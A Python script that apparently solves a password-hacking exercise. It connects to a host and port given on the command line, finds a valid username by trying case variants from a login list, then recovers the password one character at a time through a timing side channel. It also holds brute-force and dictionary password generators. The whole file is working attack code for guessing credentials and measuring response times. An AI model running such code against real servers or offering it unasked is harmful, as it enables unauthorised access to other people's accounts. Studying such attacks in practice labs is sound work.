import sys
import socket
import string
import itertools
import json
import time


def json_login_message(account, password):
    login_dict = {"login": account, "password": password}
    json_login_dict = json.dumps(login_dict, indent=4)
    return json_login_dict


def decode_json_response_message(json_response):
    response_dict = json.loads(json_response)
    return response_dict["result"]


def generate_dict_login():
    with open('logins.txt', 'r') as logins:
        for login in logins:
            login = login.strip()
            up_and_low = [[c.upper(), c.lower()] for c in login]
            possible_login = itertools.product(*up_and_low)
            for word in possible_login:
                yield "".join(word)


def try_login(address, possible_login):
    correct_login = ""
    correct_password_start = ""

    with socket.socket() as client_socket:
        client_socket.connect(address)

        for login in possible_login:
            login_message = json_login_message(login, '')
            login_message = login_message.encode()
            client_socket.send(login_message)
            response = client_socket.recv(10240)
            response = decode_json_response_message(response.decode())
            if response == "Wrong password!":
                correct_login = login
                break

        possible_password_letter = string.ascii_lowercase + string.digits + string.ascii_uppercase
        while True:
            for c in possible_password_letter:
                possible_password = correct_password_start + c
                login_message = json_login_message(correct_login, possible_password)
                login_message = login_message.encode()
                start_time = time.perf_counter()
                client_socket.send(login_message)
                response = client_socket.recv(10240)
                end_time = time.perf_counter()
                response = decode_json_response_message(response.decode())
                if (end_time - start_time) * 10 ** 6 >= 90000:
                    correct_password_start = possible_password
                    break
                elif response == "Connection success!":
                    return correct_login, possible_password


def check_password(address, password):
    with socket.socket() as client_socket:
        client_socket.connect(address)
        password = password.encode()
        client_socket.send(password)
        response = client_socket.recv(1024)
        response = response.decode()
        return response


def generate_all_password():
    num_and_letters = [c for c in string.ascii_lowercase + string.digits]
    for iter_len in range(1, len(num_and_letters) + 1):
        possible_password = itertools.product(num_and_letters, repeat=iter_len)
        for word in possible_password:
            password = "".join(word)
            yield password


def generate_dict_password():
    with open('passwords.txt', 'r') as passwords:
        for password in passwords:
            password = password.strip()
            up_and_low = [[c.upper(), c.lower()] for c in password]
            possible_password = itertools.product(*up_and_low)
            for word in possible_password:
                yield "".join(word)


def try_password(address, possible_password):
    with socket.socket() as client_socket:
        client_socket.connect(address)

        for password in possible_password:
            password = password.encode()
            client_socket.send(password)
            response = client_socket.recv(10240)
            response = response.decode()
            if response == "Connection success!":
                return password.decode()
            elif response == "Too many attempts":
                break


if __name__ == "__main__":
    hostname = sys.argv[1]
    port = int(sys.argv[2])
    addr = (hostname, port)
    poss_login = generate_dict_login()
    login_account, password = try_login(addr, poss_login)
    output_message = json_login_message(login_account, password)
    print(output_message)

